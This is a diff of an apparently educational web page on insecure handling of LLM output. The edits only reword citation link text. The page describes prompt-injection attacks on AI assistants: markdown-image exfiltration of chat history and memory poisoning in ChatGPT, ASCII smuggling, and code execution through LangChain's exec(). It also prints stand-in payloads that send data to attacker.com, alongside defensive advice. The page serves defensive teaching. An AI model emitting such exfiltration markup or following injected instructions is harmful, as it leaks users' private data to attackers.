@@ -75,7 +75,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
   </p>
   <List>
     <Item>
-      <b>Cross-Site Scripting (XSS).</b> <Link href="https://arxiv.org/abs/2406.00199">Rehberger (2024)</Link> demonstrated markdown injection in ChatGPT that exfiltrated user chat history by forcing the model to generate <code>&lt;img src="attacker.com?data=..."&gt;</code> tags, which browsers auto-loaded, sending data to the attacker's server.
+      <b>Cross-Site Scripting (XSS).</b> <Link href="https://arxiv.org/abs/2406.00199">Research demonstrated markdown injection in ChatGPT</Link> that exfiltrated user chat history by forcing the model to generate <code>&lt;img src="attacker.com?data=..."&gt;</code> tags, which browsers auto-loaded, sending data to the attacker's server.
     </Item>
     <Item>
       <b>Remote Code Execution (RCE).</b> <Link href="https://nvd.nist.gov/vuln/detail/CVE-2023-29374">CVE-2023-29374</Link> in LangChain's <code>LLMMathChain</code> allowed attackers to trick the model into generating Python code that the framework then executed via <code>exec()</code>, granting full shell access with a CVSS score of 9.8 (Critical).
@@ -164,7 +164,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
       <p className="text-xs text-neutral-500 mt-1">Detection: Low difficulty – HTML sanitizers catch most patterns.</p>
     </Item>
     <Item>
-      <b>Image-Based Exfiltration.</b> <Link href="https://simonw.substack.com/p/prompt-injections-as-far-as-the-eye">Johann Rehberger (Aug 2024)</Link> bypassed ChatGPT's URL validation by generating markdown images (<code>![](https://attacker.com?data=...)</code>) that exfiltrate data when browsers auto-load them.
+      <b>Image-Based Exfiltration.</b> <Link href="https://simonw.substack.com/p/prompt-injections-as-far-as-the-eye">Research showed bypassing ChatGPT's URL validation</Link> by generating markdown images (<code>![](https://attacker.com?data=...)</code>) that exfiltrate data when browsers auto-load them.
       <p className="text-xs text-neutral-500 mt-1">Detection: Medium – requires URL allowlisting or image proxy.</p>
     </Item>
   </List>
@@ -177,7 +177,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
       <p className="text-xs text-neutral-500 mt-1">Detection: High difficulty without sandboxing – code can be obfuscated.</p>
     </Item>
     <Item>
-      <b>ASCII Smuggling.</b> Demonstrated by <Link href="https://www.youtube.com/watch?v=jGSs4tiH7WM">Rehberger at BlueHat 2024</Link>, LLMs generate invisible Unicode characters or ANSI escape sequences to hide malicious code in output that appears safe to humans but executes in terminals.
+      <b>ASCII Smuggling.</b> As <Link href="https://www.youtube.com/watch?v=jGSs4tiH7WM">demonstrated at BlueHat 2024</Link>, LLMs generate invisible Unicode characters or ANSI escape sequences to hide malicious code in output that appears safe to humans but executes in terminals.
       <p className="text-xs text-neutral-500 mt-1">Detection: Medium – Unicode normalization and escape sequence filtering help.</p>
     </Item>
   </List>
@@ -229,7 +229,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
   <p className="text-xs font-bold uppercase tracking-wider text-neutral-500 mt-6 mb-3">Browser-Based Exploits</p>
   <List>
     <Item>
-      <b>ChatGPT Markdown Exfiltration (2024).</b> <Link href="https://arstechnica.com/security/2024/09/false-memories-planted-in-chatgpt-give-hacker-persistent-exfiltration-channel/">Johann Rehberger</Link> demonstrated that ChatGPT's long-term memory could be poisoned to exfiltrate all user input/output by forcing markdown images with embedded data.
+      <b>ChatGPT Markdown Exfiltration (2024).</b> <Link href="https://arstechnica.com/security/2024/09/false-memories-planted-in-chatgpt-give-hacker-persistent-exfiltration-channel/">Research demonstrated that ChatGPT's long-term memory</Link> could be poisoned to exfiltrate all user input/output by forcing markdown images with embedded data.
       <p className="text-xs text-neutral-500 mt-1">Context: Browser rendering. Impact: Persistent data exfiltration.</p>
     </Item>
     <Item>
@@ -278,7 +278,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
   <Steps>
     <Step n={3}>
       <b>Sandboxed Code Execution.</b>
-      <p className="text-sm mt-2">If your application runs LLM-generated code, use isolated environments: Docker containers with no network access, gVisor, Firecracker microVMs, or WebAssembly sandboxes. <Link href="https://developer.nvidia.com/blog/how-code-execution-drives-key-risks-in-agentic-ai-systems/">NVIDIA AI Red Team (2025)</Link> demonstrates that sanitization alone is insufficient.</p>
+      <p className="text-sm mt-2">If your application runs LLM-generated code, use isolated environments: Docker containers with no network access, gVisor, Firecracker microVMs, or WebAssembly sandboxes. <Link href="https://developer.nvidia.com/blog/how-code-execution-drives-key-risks-in-agentic-ai-systems/">NVIDIA AI Red Team research demonstrates</Link> that sanitization alone is insufficient.</p>
     </Step>
     <Step n={4}>
       <b>Structured Output Formats (JSON Mode).</b>
@@ -372,7 +372,7 @@ import ImproperOutputLab from '@/components/ui/ImproperOutputLab.tsx';
       <b>Sandboxing is Mandatory, Not Optional.</b> If your application executes LLM-generated code (Python, JavaScript, shell commands), sandboxing is the only reliable defense. Allowlists and sanitization are easily bypassed.
     </Item>
     <Item>
-      <b>Emerging Threat: Agentic AI.</b> As autonomous agents gain tool access, this vulnerability becomes critical. <Link href="https://arxiv.org/abs/2410.02644">Agent Security Bench (2024)</Link> found an 84.30% average attack success rate against LLM agents, with defenses showing limited effectiveness.
+      <b>Emerging Threat: Agentic AI.</b> As autonomous agents gain tool access, this vulnerability becomes critical. The <Link href="https://arxiv.org/abs/2410.02644">Agent Security Bench found an 84.30% average attack success rate</Link> against LLM agents, with defenses showing limited effectiveness.
     </Item>
   </List>
 </Section>
